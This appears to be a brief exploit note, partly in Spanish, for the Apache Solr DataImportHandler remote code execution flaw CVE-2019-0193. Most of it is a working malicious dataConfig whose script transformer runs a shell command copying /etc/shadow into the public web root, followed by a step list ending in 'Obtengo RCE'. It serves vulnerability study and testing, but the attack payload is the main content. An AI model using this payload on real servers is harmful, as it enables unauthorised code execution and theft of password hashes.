# Apache Solr (​https://lucene.apache.org/solr/​)
# Apache Solr DataImport Handler RCE (​https://github.com/jas502n/CVE-2019-0193​)

<dataConfig>
    <dataSource type="URLDataSource"/>
    <script><![CDATA[
        function poc(){ java.lang.Runtime.getRuntime().exec("cp /etc/shadow /opt/solr/server/solr-webapp/webapp/poc.txt");
}
]]></script>
<document>
    <entity name="stackoverflow"
        url="http://X/solr"
        processor="XPathEntityProcessor"
        forEach="/note"
        transformer="script:poc" />
</document>
</dataConfig>

- Envío un **dataConfig malicioso** a Solr
    
- Solr acepta la configuración
    
- Solr descarga un XML remoto
    
- El XML activa transformer
    
- El script se ejecuta en el servidor
    
- Obtengo **RCE**


